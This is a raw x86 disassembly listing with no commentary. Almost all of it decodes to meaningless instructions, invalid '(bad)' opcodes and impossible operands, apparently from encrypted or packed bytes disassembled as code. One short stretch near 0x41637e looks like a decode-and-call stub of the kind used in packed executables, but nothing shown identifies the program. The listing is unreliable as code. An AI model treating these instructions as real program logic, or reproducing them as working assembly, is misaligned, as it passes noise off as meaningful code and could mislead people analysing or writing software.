  416105:	and    ecx,ecx
  416107:	clc    
  416108:	mov    ebx,0x96546034
  41610d:	mov    cs,WORD PTR [ebx]
  41610f:	jbe    0x4160b6
  416111:	cmp    eax,0xd96f77d6
  416116:	jae    0x41611d
  416118:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416119:	clc    
  41611a:	repz iret 
  41611c:	sti    
  41611d:	imul   ebp,DWORD PTR [esi+0x44],0xffffffe7
  416121:	cwde   
  416122:	inc    edi
  416123:	mov    dh,0x12
  416125:	pop    ecx
  416126:	in     al,dx
  416127:	push   0x49
  416129:	jle    0x41615a
  41612b:	add    al,0x37
  41612d:	(bad)  
  41612e:	jbe    0x4160bb
  416130:	fldpi  
  416132:	mov    eax,esp
  416134:	test   al,0xb6
  416136:	iret   
  416137:	jp     0x416105
  416139:	sub    DWORD PTR [edx-0x7bc08f78],esp
  41613f:	sbb    eax,0x42cfbeac
  416144:	daa    
  416145:	std    
  416146:	mov    cl,0x78
  416149:	cmp    DWORD PTR ds:0x5a50a1b0,ebp
  41614f:	mov    DWORD PTR [ebx],esi
  416151:	add    ah,ch
  416153:	ins    BYTE PTR es:[edi],dx
  416154:	inc    edx
  416155:	and    BYTE PTR [ebx+eax*1],0x0
  416159:	lock retf 
  41615b:	push   ebx
  41615c:	lahf   
  41615d:	add    BYTE PTR [ebx-0x8],0x21
  416161:	cli    
  416162:	xlat   BYTE PTR ds:[ebx]
  416163:	loope  0x416167
  416165:	test   DWORD PTR [edi+0x59],edi
  416168:	shl    DWORD PTR ds:0x6be637c7,0xc9
  41616f:	jge    0x4161e6
  416171:	mov    al,0x3d
  416173:	(bad)
  416176:	dec    esp
  416177:	fisttp QWORD PTR [esi-0x16]
  41617a:	or     bl,al
  41617c:	adc    bh,BYTE PTR [esi+ecx*1-0x5f]
  416180:	cwde   
  416181:	inc    DWORD PTR [edx-0x4]
  416184:	aaa    
  416185:	stos   DWORD PTR es:[edi],eax
  416186:	inc    eax
  416187:	dec    edi
  416188:	sysexit 
  41618a:	(bad)  
  41618b:	(bad)  [eax-0x7bf4b44]
  416191:	mov    bh,0x92
  416193:	mov    ecx,0xc82562f8
  416198:	int3   
  416199:	adc    eax,0xe5b055fd
  41619e:	pushf  
  41619f:	cmp    al,0xa
  4161a1:	sub    al,0xee
  4161a3:	jmp    0x416197
  4161a5:	ins    BYTE PTR es:[edi],dx
  4161a6:	adc    al,0x98
  4161a8:	xor    eax,0xe81aad5a
  4161ad:	dec    esi
  4161ae:	in     al,dx
  4161af:	jle    0x416157
  4161b1:	lds    eax,FWORD PTR [ebx]
  4161b3:	les    ecx,FWORD PTR [edx]
  4161b5:	jmp    0xc714:0xfd604348
  4161bc:	(bad)  
  4161bd:	jb     0x41617c
  4161bf:	mov    ds:0x1a52570,al
  4161c4:	inc    edi
  4161c5:	loop   0x41623c
  4161c7:	add    dh,bl
  4161c9:	mov    cl,bh
  4161cb:	cld    
  4161cc:	xchg   edx,eax
  4161cd:	lea    edx,[ebp-0x523f6036]
  4161d3:	mov    eax,ds:0xaeb8368
  4161d8:	sbb    DWORD PTR [esi-0x64],esp
  4161db:	mov    ebx,0x4e6c5233
  4161e0:	lahf   
  4161e1:	adc    dh,cl
  4161e3:	xchg   ecx,eax
  4161e4:	out    0x79,eax
  4161e6:	outs   dx,BYTE PTR ds:[esi]
  4161e7:	xchg   ecx,eax
  4161e8:	adc    cl,BYTE PTR [edx+0x50]
  4161eb:	lds    ebp,FWORD PTR [eax+0x40]
  4161ee:	test   BYTE PTR [esp+esi*8-0x4a],0xcb
  4161f3:	cmp    cl,bh
  4161f5:	jae    0x416247
  4161f7:	ss pusha 
  4161f9:	sub    dh,cl
  4161fb:	daa    
  4161fc:	pop    edx
  4161fd:	pop    esp
  4161fe:	mov    esi,0xa65fcf4e
  416203:	mov    edx,0xa0841df1
  416208:	mov    ebx,0xd3583a6b
  41620d:	rcr    BYTE PTR [esi+ebp*1-0x29],cl
  416211:	fwait
  416212:	lock std 
  416214:	push   esi
  416215:	adc    ebp,edx
  416217:	adc    BYTE PTR [ebp-0x80],0x12
  41621b:	sub    esp,DWORD PTR [ecx+0xb]
  41621e:	mov    ebp,0x5bf16fa9
  416223:	outs   dx,BYTE PTR ds:[esi]
  416224:	jne    0x4162a2
  416226:	nop
  416227:	fld    st(1)
  416229:	rcr    BYTE PTR [esi+0x41],1
  41622c:	rcr    BYTE PTR [edx-0x1911fe98],cl
  416232:	cwde   
  416233:	push   ebp
  416234:	fstp   st(7)
  416236:	cmp    cl,BYTE PTR [ebx-0x63]
  416239:	mov    dh,0xcf
  41623b:	dec    eax
  41623c:	dec    esp
  41623d:	lods   al,BYTE PTR ds:[esi]
  41623e:	mov    bh,0x58
  416240:	jmp    ebx
  416242:	sub    al,0xd9
  416244:	jnp    0x4161e5
  416246:	mov    ah,0x54
  416248:	sbb    BYTE PTR [esi+edx*8],0x8a
  41624c:	sti    
  41624d:	cmp    eax,DWORD PTR [eax]
  41624f:	dec    ebx
  416250:	(bad)  
  416251:	rcr    eax,1
  416253:	sti    
  416254:	outs   dx,DWORD PTR ds:[esi]
  416255:	je     0x4161dc
  416257:	addr16 inc ebp
  416259:	in     eax,dx
  41625a:	ins    BYTE PTR es:[edi],dx
  41625b:	test   eax,0x75cd54f0
  416260:	pushf  
  416261:	xchg   BYTE PTR [edx],ah
  416263:	jae    0x416222
  416265:	sbb    eax,0xef21c0e4
  41626a:	sub    bh,ah
  41626c:	mov    esi,0x63731e60
  416271:	pop    edi
  416272:	jne    0x41629d
  416274:	stos   DWORD PTR es:[edi],eax
  416275:	xchg   ebp,eax
  416276:	jge    0x41625a
  416278:	pop    ecx
  416279:	cmp    BYTE PTR [esi+0x50],bh
  41627c:	lock mov esp,?
  41627f:	xor    ebx,DWORD PTR [ebx-0x6394bba4]
  416285:	nop
  416286:	mov    bl,0x0
  416288:	ss mov esi,0xfcd41202
  41628e:	jmp    0x4162da
  416290:	icebp  
  416291:	ja     0x41625c
  416293:	sbb    ebx,esp
  416295:	sbb    eax,0x470d4589
  41629a:	pushf  
  41629b:	jl     0x4162da
  41629d:	mov    cl,0xb5
  41629f:	rcr    bh,cl
  4162a1:	stos   DWORD PTR es:[edi],eax
  4162a2:	sbb    al,0x29
  4162a4:	lods   eax,DWORD PTR ds:[esi]
  4162a5:	or     dh,dl
  4162a7:	mov    ch,0x87
  4162a9:	xchg   edi,eax
  4162aa:	out    0x61,al
  4162ac:	or     edx,DWORD PTR [ebp-0x386b0af0]
  4162b2:	pop    ebp
  4162b3:	popf   
  4162b4:	add    DWORD PTR [eax],edx
  4162b6:	mov    esp,0x94a430a7
  4162bb:	add    esp,DWORD PTR [ebx-0x63]
  4162be:	stos   DWORD PTR es:[edi],eax
  4162bf:	jge    0x4162b7
  4162c1:	jmp    0x4162e3
  4162c3:	xor    DWORD PTR [edi+edi*2+0x34],edx
  4162c7:	inc    ebp
  4162c8:	xchg   ebp,edx
  4162ca:	sub    esi,DWORD PTR [edx+0x57e03893]
  4162d0:	ja     0x4162dd
  4162d2:	push   ecx
  4162d3:	add    al,0x8e
  4162d5:	push   eax
  4162d6:	dec    edi
  4162d7:	mov    ah,0x3f
  4162d9:	shl    BYTE PTR [ecx+eax*8+0x5244609f],cl
  4162e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162e1:	fs aam 0x53
  4162e4:	pusha  
  4162e5:	test   eax,0xe1eec72a
  4162ea:	add    DWORD PTR [edi],ebp
  4162ec:	cmc    
  4162ed:	pop    es
  4162ee:	pushf  
  4162ef:	test   BYTE PTR [esi+0x5b508f75],0x68
  4162f6:	mov    dl,0xd4
  4162f8:	xchg   ebp,eax
  4162f9:	(bad)  
  4162fa:	stos   DWORD PTR es:[edi],eax
  4162fb:	es dec edi
  4162fd:	ror    al,cl
  4162ff:	mov    dl,0x86
  416301:	icebp  
  416302:	inc    esi
  416303:	rcl    DWORD PTR [ecx+eax*4+0x42411919],1
  41630a:	and    esi,edi
  41630c:	add    al,dh
  41630e:	and    DWORD PTR [ebx+0x703e3f51],0x336c6e3a
  416318:	sahf   
  416319:	inc    ecx
  41631a:	fs icebp 
  41631c:	mov    al,0x7d
  41631e:	mov    edx,0xd316aa33
  416323:	int3   
  416324:	dec    edi
  416325:	ret    0x584
  416328:	sub    edi,0x392ced90
  41632e:	inc    ebx
  41632f:	ja     0x416361
  416331:	mov    ebx,0xd126f837
  416336:	inc    eax
  416337:	loop   0x41634a
  416339:	mov    ebx,0xfde893ba
  41633e:	pushf  
  41633f:	fs icebp 
  416341:	mov    eax,ds:0x3d0338b5
  416346:	icebp  
  416347:	mov    ebp,0x65ee22d8
  41634c:	icebp  
  41634d:	nop
  41634e:	sub    ebp,DWORD PTR [eax]
  416350:	pop    ebp
  416351:	fabs   
  416353:	out    0xa0,eax
  416355:	cmp    al,BYTE PTR [esi-0x8]
  416358:	inc    edx
  416359:	mov    esi,DWORD PTR [ecx-0x23]
  41635c:	iret   
  41635d:	add    al,0x46
  41635f:	sbb    dl,BYTE PTR [ecx]
  416361:	sub    eax,0xee38786
  416366:	call   0x3b057d80
  41636b:	mov    al,0x8b
  41636d:	dec    ebp
  41636e:	or     BYTE PTR [ebp+0x729c0a8c],cl
  416374:	xor    al,BYTE PTR [eax]
  416376:	cmp    ecx,eax
  416378:	jne    0x4154a0
  41637e:	mov    ebx,esi
  416380:	jmp    0x41638a
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0xc5c3c841
  4163bf:	pop    ecx
  4163c0:	inc    esi
  4163c1:	adc    edx,DWORD PTR [edi+edi*2]
  4163c4:	jo     0x41637f
  4163c6:	jle    0x416438
  4163c8:	jo     0x4163fb
  4163ca:	add    DWORD PTR [eax-0x59150fee],edx
  4163d0:	jmp    0x10e622c6
  4163d5:	mov    al,0x0
  4163d7:	call   0xf4f27124
  4163dc:	and    dh,BYTE PTR [eax]
  4163de:	lahf   
  4163df:	ds pop es
  4163e1:	or     esp,DWORD PTR [edx+ecx*8]
  4163e4:	cwde   
  4163e5:	cs cmp al,0x8c
  4163e8:	mov    al,0x82
  4163ea:	and    esi,DWORD PTR [edx+esi*1]
  4163ed:	inc    edi
  4163ee:	sar    edx,cl
  4163f0:	or     DWORD PTR [edi+0x63],esi
  4163f3:	cwde   
  4163f4:	cmp    al,0x81
  4163f6:	sub    al,0xd3
  4163f8:	add    BYTE PTR [ecx+0x74aac244],0xa6
  4163ff:	clc    
  416400:	fistp  QWORD PTR [esi]
  416402:	mov    dh,0xa9
  416404:	stos   BYTE PTR es:[edi],al
  416405:	std    
  416406:	ds pop ecx
  416408:	mov    bl,0xda
  41640a:	shl    BYTE PTR [ebp+0x574741f9],0x25
  416411:	xor    al,0x71
  416413:	pop    esi
  416414:	imul   edi,ebx,0xf44a8c99
  41641a:	push   ss
  41641b:	xchg   ebp,eax
  41641c:	loop   0x41645a
  41641e:	inc    ebp
  41641f:	pop    esp
  416420:	adc    esi,DWORD PTR [eax+0x14c0d5e3]
  416426:	and    al,0x19
  416428:	add    BYTE PTR [eax],ah
  41642a:	mov    esp,0x5a57365d
  41642f:	inc    eax
  416430:	retf   
  416431:	mov    eax,0xb373d7de
  416436:	es cmc 
  416438:	push   edi
  416439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41643a:	dec    edi
  41643b:	in     al,0xc8
  41643d:	inc    ebp
  41643e:	(bad)  
  41643f:	sbb    dl,bl
  416441:	pop    ebx
  416442:	sub    eax,0xf26665bc
  416447:	pop    esp
  416448:	jb     0x416493
  41644a:	inc    ebp
  41644b:	jl     0x41647e
  41644d:	stc    
  41644e:	xor    cl,BYTE PTR [eax-0x6f]
  416451:	ja     0x4163e1
  416453:	sbb    bl,BYTE PTR [eax+0xda2b26e]
  416459:	push   esi
  41645a:	das    
  41645b:	rcr    DWORD PTR [ebx],1
  41645d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41645e:	jnp    0x41645f
  416460:	mov    dl,0x9d
  416462:	inc    eax
  416463:	xchg   DWORD PTR [edi-0x80],edi
  416466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416467:	mov    esi,0x39db9227
  41646c:	mov    edi,0x733c0aa5
  416471:	and    cl,BYTE PTR [ebx]
  416473:	nop
  416474:	push   edi
  416475:	xor    DWORD PTR [edi+0x15],edi
  416478:	inc    esi
  416479:	rcl    DWORD PTR [ecx+esi*4-0x179d6f6a],cl
  416480:	repnz push edx
  416482:	aas    
  416483:	xchg   DWORD PTR [esi],edi
  416485:	ins    DWORD PTR es:[edi],dx
  416486:	adc    al,dl
  416488:	sahf   
  416489:	pop    edi
  41648a:	push   DWORD PTR [esi-0x12]
  41648d:	mov    ch,0x6e
  41648f:	in     eax,0xcd
  416491:	mov    ebx,db0
  416494:	retf   
  416495:	push   ecx
  416496:	aad    0x22
  416498:	data16 adc ah,BYTE PTR [ecx+0xf66963]
  41649f:	or     eax,0x2621e857
  4164a4:	or     al,0x60
  4164a6:	inc    edx
  4164a7:	push   edx
  4164a8:	call   0x8004:0x579d4c06
  4164af:	and    al,0xb9
  4164b1:	jmp    0x293711df
  4164b6:	cmc    
  4164b7:	mov    esi,0x42632c98
  4164bc:	mov    cl,0xad
  4164be:	pop    ss
  4164bf:	les    ecx,FWORD PTR [edx-0x27]
  4164c2:	pop    ebp
  4164c3:	(bad)  
  4164c4:	push   edx
  4164c5:	push   esp
  4164c6:	popa   
  4164c7:	fcom   QWORD PTR [edi+0x44108605]
  4164cd:	dec    ecx
  4164ce:	stos   DWORD PTR es:[edi],eax
  4164cf:	cli    
  4164d0:	icebp  
  4164d1:	dec    ebx
  4164d2:	jp     0x416506
  4164d4:	imul   esi,ecx,0xffffff93
  4164d7:	push   ss
  4164d8:	pop    ebp
  4164d9:	cli    
  4164da:	xchg   edx,eax
  4164db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164dc:	push   ebx
  4164dd:	les    eax,FWORD PTR [ebp+0xe]
  4164e0:	xchg   DWORD PTR [ebx-0x726d8656],esi
  4164e6:	dec    ecx
  4164e7:	dec    ebp
  4164e8:	test   BYTE PTR [ebx],ch
  4164ea:	(bad)
  4164ed:	jmp    0x41648b
  4164ef:	shr    BYTE PTR gs:[ebx+edi*1-0x6c18847e],cl
  4164f7:	scas   eax,DWORD PTR es:[edi]
  4164f8:	dec    esp
  4164f9:	adc    DWORD PTR [edi-0x35],0xe7814797
  416500:	imul   esp,DWORD PTR [ecx-0xd],0xe6bbc252
  416507:	fsub   QWORD PTR [esp+ebx*4+0x49]
  41650b:	mov    al,0xe8
  41650d:	mov    eax,0xdbca11c
  416512:	jae    0x4164dc
  416514:	fld    TBYTE PTR cs:[ebp+eax*4+0x293a2e94]
  41651c:	daa    
  41651d:	jo     0x41656c
  41651f:	mov    ebp,0xc91a3af7
  416524:	dec    ebp
  416525:	fisttp QWORD PTR [ebp-0x509d8522]
  41652b:	mov    ah,BYTE PTR [esi]
  41652d:	cmp    dh,BYTE PTR [eax]
  41652f:	lock adc al,0x42
  416532:	fnstsw WORD PTR [ebx]
  416534:	sub    al,0x76
  416536:	adc    BYTE PTR [ecx-0x21de4d54],0x15
  41653d:	arpl   WORD PTR [edx-0x64671b8b],bp
  416543:	cwde   
  416544:	or     bh,bl
  416546:	arpl   WORD PTR [esi],cx
  416548:	inc    ebx
  416549:	std    
  41654a:	or     eax,0x1accec21
  41654f:	mov    DWORD PTR [edx-0x5c],ebx
  416552:	xor    BYTE PTR [eax+0x22dd194a],ch
  416558:	cmp    eax,0x1df3a9c0
  41655d:	sbb    dl,ch
  41655f:	dec    BYTE PTR [edi+0x3]
  416562:	adc    ebx,DWORD PTR [edi]
  416564:	dec    eax
  416565:	cwde   
  416566:	cmp    al,0xec
  416568:	and    al,0x9a
  41656a:	lea    edi,[esi+0x74]
  41656d:	mov    edx,DWORD PTR [ebx+0x5f]
  416570:	adc    BYTE PTR [ebx+esi*8+0x66],bh
  416574:	pop    edi
  416575:	jge    0x4165d2
  416577:	pusha  
  416578:	jg     0x4164fe
  41657a:	popf   
  41657b:	jb     0x4165e7
  41657d:	stos   BYTE PTR es:[edi],al
  41657e:	jmp    0x41657c
  416580:	jns    0x4165d5
  416582:	outs   dx,BYTE PTR ds:[esi]
  416583:	pop    ecx
  416584:	ins    BYTE PTR es:[edi],dx
  416585:	or     eax,0x1284b107
  41658a:	idiv   BYTE PTR [ebx+edx*2-0x705457f]
  416591:	sbb    al,0x84
  416593:	arpl   WORD PTR [edx],bp
  416595:	mov    edi,0x8f21dbcb
  41659a:	fwait
  41659b:	mov    WORD PTR ss:[eax-0x5e537fd1],fs
  4165a2:	outs   dx,DWORD PTR ds:[esi]
  4165a3:	jmp    0x7ca1274c
  4165a8:	pop    ds
  4165a9:	inc    ebp
  4165aa:	imul   edx,DWORD PTR [edx],0x67afcccd
  4165b0:	packssdw mm2,QWORD PTR [edi+0x21]
  4165b4:	or     edi,edi
  4165b6:	shr    DWORD PTR [edx],0x3f
  4165b9:	jbe    0x4165e1
  4165bb:	in     al,0x7e
  4165bd:	inc    edi
  4165be:	mov    eax,tr0
  4165c1:	push   eax
  4165c2:	loope  0x416597
  4165c4:	cs std 
  4165c6:	call   0xaa6e:0x544baf70
  4165cd:	sub    al,0x2b
  4165cf:	ret    
  4165d0:	jmp    0x4165c0
  4165d2:	loope  0x416596
  4165d4:	mov    bh,0x16
  4165d6:	ficomp DWORD PTR [eax+ebp*2-0x6a]
  4165da:	cmp    al,al
  4165dc:	shr    DWORD PTR [eax+0x1ac89540],1
  4165e2:	(bad)  
  4165e5:	xchg   ebx,eax
  4165e6:	pushf  
  4165e7:	ret    
  4165e8:	cmovbe esi,DWORD PTR ds:0xfa2cd3b1
  4165ef:	dec    edx
  4165f0:	push   ebx
  4165f1:	cmp    bh,BYTE PTR [eax]
  4165f3:	dec    eax
  4165f4:	adc    eax,0x8fd633ca
  4165f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165fa:	sbb    DWORD PTR [esi],ebp
  4165fc:	fidivr WORD PTR [ebp+0x38]
  4165ff:	or     bh,cl
  416601:	xchg   ebx,eax
  416602:	push   edx
  416603:	pop    ebp
  416604:	push   esi
  416605:	in     eax,0xd2
  416607:	lea    esp,[esi+0xc427c7f]
  41660d:	sbb    eax,0xe3929006
  416612:	arpl   WORD PTR [ecx+0x6],ax
  416615:	or     al,0x62
  416617:	hlt    
  416618:	into   
  416619:	test   DWORD PTR [edi-0x3f],0x588880d0
  416620:	sbb    ch,BYTE PTR [edx]
  416622:	sub    eax,0x8a560b2a
  416627:	jmp    0xc420:0x7c8c7dad
  41662e:	loopne 0x416626
  416630:	inc    esi
  416631:	inc    esp
  416632:	test   BYTE PTR [eax-0x2c5f4f47],0xdd
  416639:	stc    
  41663a:	scas   al,BYTE PTR es:[edi]
  41663b:	jp     0x416617
  41663d:	aad    0xa9
  41663f:	push   ds
  416640:	inc    esp
  416641:	dec    edi
  416642:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416643:	and    cl,BYTE PTR [ecx-0x69]
  416646:	mov    bh,0x3a
  416648:	push   eax
  416649:	add    bl,BYTE PTR [eax]
  41664b:	adc    dl,BYTE PTR [esi-0x11c49dda]
  416651:	and    al,0x91
  416653:	leave  
  416654:	inc    eax
  416655:	push   es
  416656:	rcr    DWORD PTR [esi],cl
  416658:	push   ecx
  416659:	dec    eax
  41665a:	into   
  41665b:	nop
  41665c:	adc    BYTE PTR ss:[edi-0x54e7175f],bl
  416663:	fs mov dh,0x91
  416666:	imul   ebx,DWORD PTR [edx],0xffffffe0
  416669:	lds    eax,FWORD PTR [edx+0x2d]
  41666c:	imul   esi,ebx,0xef21fcbc
  416672:	sub    eax,DWORD PTR [edx-0x70]
  416675:	push   es
  416676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416677:	int3   
  416678:	lea    esi,[eax]
  41667a:	mov    WORD PTR [ebp+0x28c91dc9],gs
  416680:	data16 fwait
  416682:	aaa    
  416683:	sbb    al,0x5f
  416685:	inc    ebx
  416686:	leave  
  416687:	scas   al,BYTE PTR es:[edi]
  416688:	cmp    BYTE PTR [ecx+0xd],ch
  41668b:	pop    eax
  41668c:	lahf   
  41668d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41668e:	loope  0x416707
  416690:	xchg   edx,eax
  416691:	push   0xa
  416693:	pop    ecx
  416694:	push   0x4
  416696:	pop    ebx
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x416705
  4166ae:	mov    bl,0x4b
  4166b0:	pop    edx
  4166b1:	pop    esp
  4166b2:	adc    bh,BYTE PTR [edi+0x70]
  4166b5:	mov    ecx,0x4470707e
  4166ba:	sub    eax,0xdaa424db
  4166bf:	jmp    0x4166af
  4166c1:	xor    al,0x50
  4166c3:	cmp    al,0x58
  4166c5:	leave  
  4166c6:	adc    eax,0xb6c5515e
  4166cb:	cmp    ebp,DWORD PTR [eax-0x2e655153]
  4166d1:	sub    DWORD PTR [edx],ebp
  4166d3:	stos   BYTE PTR es:[edi],al
  4166d4:	nop
  4166d5:	loop   0x41674b
  4166d7:	jae    0x41674e
  4166d9:	sbb    al,0xf1
  4166db:	push   ds
  4166dc:	test   BYTE PTR [edx+0x10c5ab94],ch
  4166e2:	repnz and BYTE PTR [ecx],dl
  4166e5:	pop    esi
  4166e6:	(bad)  
  4166e8:	mov    ecx,0x539da402
  4166ed:	repnz or edx,esp
  4166f0:	rcr    dh,1
  4166f2:	add    edi,DWORD PTR [eax+edi*4-0x6b3058cf]
  4166f9:	sbb    eax,0xaab48549
  4166ff:	push   ds
  416700:	mov    cl,0x17
  416702:	(bad)  
  416703:	out    0x2a,eax
  416705:	lods   eax,DWORD PTR ds:[esi]
  416706:	or     eax,0x27749fe2
  41670b:	and    al,0xde
  41670d:	pop    ebp
  41670e:	jg     0x416702
  416710:	and    ecx,esp
  416712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416713:	dec    edi
  416714:	jbe    0x4166de
  416716:	push   ecx
  416717:	and    al,BYTE PTR [ecx+eax*8-0x2f8cade4]
  41671e:	call   0x85539651
  416723:	cmp    eax,0x8c9fb8ce
  416728:	jp     0x416768
  41672a:	inc    edi
  41672b:	jmp    FWORD PTR [esi-0x3feeb95c]
  416731:	mov    ds:0x6d51e197,al
  416736:	or     DWORD PTR [ecx],ebp
  416738:	cmp    al,al
  41673a:	ret    
  41673b:	sub    BYTE PTR [edx+eiz*2-0x12daeff6],al
  416742:	int    0x19
  416744:	or     cl,BYTE PTR [esi]
  416746:	(bad)  
  416747:	call   0xe46e9392
  41674c:	shl    BYTE PTR [ebx],0xa9
  41674f:	pop    ss
  416750:	fbstp  TBYTE PTR [esi-0x3376a37e]
  416756:	mov    es,WORD PTR [esi+0x47167db0]
  41675c:	pop    edi
  41675d:	popf   
  41675e:	rep outs dx,BYTE PTR ds:[esi]
  416760:	xor    eax,0x5d3bb28d
  416765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416766:	stc    
  416767:	push   esi
  416768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41676a:	shl    BYTE PTR [ebp+ebp*8+0x5ecb694b],cl
  416771:	scas   eax,DWORD PTR es:[edi]
  416772:	call   0xefba:0x3dd3c678
  416779:	dec    eax
  41677a:	test   al,0xdd
  41677c:	(bad)  
  41677d:	mov    eax,esp
  41677f:	test   DWORD PTR [edi-0x4312369],ebx
  416785:	hlt    
  416786:	in     eax,dx
  416787:	imul   eax,DWORD PTR [ebx],0xfffffffc
  41678a:	jg     0x416771
  41678c:	cmc    
  41678d:	mov    ebx,0x9a85b018
  416792:	rol    dl,0x6
  416795:	popa   
  416796:	xor    DWORD PTR [ebx-0x61],esi
  416799:	mov    dh,0xeb
  41679b:	(bad)  
  41679d:	sti    
  41679e:	or     eax,0xd9ab5a1f
  4167a3:	ja     0x41678c
  4167a5:	enter  0xc32b,0x59
  4167a9:	xlat   BYTE PTR ds:[ebx]
  4167aa:	xchg   ecx,eax
  4167ab:	fdiv   QWORD PTR [ebx]
  4167ad:	out    dx,eax
  4167ae:	cs push ebp
  4167b0:	jge    0x416795
  4167b2:	push   0xffffff8e
  4167b4:	mov    ecx,esp
  4167b6:	adc    al,0xd4
  4167b8:	retf   0xa749
  4167bb:	imul   esi,ebp,0x61
  4167be:	and    al,0x60
  4167c0:	call   0x8a706580
  4167c5:	add    dl,BYTE PTR [esi+edx*1+0x3a]
  4167c9:	jmp    0x43a69f5a
  4167ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167cf:	icebp  
  4167d0:	stos   DWORD PTR es:[edi],eax
  4167d1:	in     eax,0xd
  4167d3:	pushf  
  4167d4:	in     eax,dx
  4167d5:	or     al,BYTE PTR [esi-0x5c]
  4167d8:	mov    bh,0x66
  4167da:	addr16 cmp al,0xe8
  4167dd:	arpl   WORD PTR [esi+0x14b358ab],ax
  4167e3:	push   esp
  4167e4:	pop    ebx
  4167e5:	inc    eax
  4167e6:	jb     0x416798
  4167e8:	cld    
  4167e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167ea:	mov    ch,0x88
  4167ec:	mov    al,0x1d
  4167ee:	push   ds
  4167ef:	xchg   ebx,eax
  4167f0:	cmp    ch,BYTE PTR [ecx]
  4167f2:	push   ss
  4167f3:	std    
  4167f4:	lahf   
  4167f5:	enter  0x582a,0x53
  4167f9:	sub    BYTE PTR [ecx],bh
  4167fb:	stos   BYTE PTR es:[edi],al
  4167fc:	(bad)  [edi]
  4167fe:	adc    ebx,DWORD PTR [ebx-0x63]
  416801:	mov    edx,0xfc4d43a5
  416806:	test   DWORD PTR [esp+edx*4],ecx
  416809:	jne    0x416879
  41680b:	adc    eax,0x4aa3faa7
  416810:	scas   eax,DWORD PTR es:[edi]
  416811:	add    BYTE PTR [eax-0x6],dl
  416814:	int    0x71
  416816:	cmp    dl,BYTE PTR [edx]
  416818:	js     0x4167f8
  41681a:	fdiv   st,st(3)
  41681c:	pop    ss
  41681d:	xchg   ebx,eax
  41681e:	adc    eax,0x66558dbc
  416823:	inc    eax
  416824:	js     0x416824
  416826:	loop   0x4167e9
  416828:	fwait
  416829:	icebp  
  41682a:	xchg   ecx,eax
  41682b:	shl    BYTE PTR [edi-0x71],0xbb
  41682f:	in     eax,0x60
  416831:	push   ebx
  416832:	leave  
  416833:	adc    ecx,DWORD PTR ds:0x63658277
  416839:	enter  0xe14a,0xaa
  41683d:	mov    ds:0x97ac3634,al
  416842:	sbb    DWORD PTR [ebx],ecx
  416844:	(bad)  
  416845:	push   ebx
  416846:	jle    0x4167fb
  416848:	lock pop edi
  41684a:	dec    esi
  41684b:	pop    ecx
  41684c:	outs   dx,BYTE PTR ds:[esi]
  41684d:	inc    edi
  41684e:	cmp    BYTE PTR [ecx],0x69
  416851:	popf   
  416852:	sahf   
  416853:	dec    ebx
  416854:	into   
  416855:	cld    
  416856:	push   es
  416857:	es pop edx
  416859:	mov    DWORD PTR [ecx],edi
  41685b:	sub    BYTE PTR [esp+ebx*2+0x1bd7dd68],ch
  416862:	popf   
  416863:	pop    ss
  416864:	adc    ebx,DWORD PTR [ecx+0x767a7ddc]
  41686a:	xor    eax,0xcbfe4272
  41686f:	fst    DWORD PTR [eax-0x6c]
  416872:	inc    esp
  416873:	gs aas 
  416875:	in     al,dx
  416876:	mov    ah,BYTE PTR [eax+0x3b]
  416879:	mov    ecx,DWORD PTR [ecx-0x6c219a0c]
  41687f:	jbe    0x4168ee
  416881:	mov    al,ds:0x8f487049
  416886:	cmc    
  416887:	dec    ecx
  416888:	cmc    
  416889:	je     0x4168aa
  41688b:	adc    al,al
  41688d:	adc    eax,0x35582a46
  416892:	pop    ebx
  416893:	sahf   
  416894:	shl    BYTE PTR [edi],1
  416896:	out    0x2c,eax
  416898:	pop    edi
  416899:	add    eax,0xc5705f19
  41689e:	or     BYTE PTR [ecx+0x47],cl
  4168a1:	sbb    al,0x28
  4168a3:	aam    0x3a
  4168a5:	jp     0x4168d8
  4168a7:	imul   esi,DWORD PTR [edx+0x6acfc6d7],0x933a971f
  4168b1:	dec    edx
  4168b2:	or     BYTE PTR [esi+0x2cc3de1b],ah
  4168b8:	jnp    0x4168d7
  4168ba:	dec    eax
  4168bb:	(bad)  
  4168bc:	or     eax,0x3c21f271
  4168c1:	fisubr DWORD PTR [edx+0x1e]
  4168c4:	xor    al,0xe5
  4168c6:	mov    ebp,0x331d612
  4168cb:	and    BYTE PTR [ebp+0x497309d8],bl
  4168d1:	stc    
  4168d2:	shr    edi,1
  4168d4:	hlt    
  4168d5:	mov    ecx,0x7850b79f
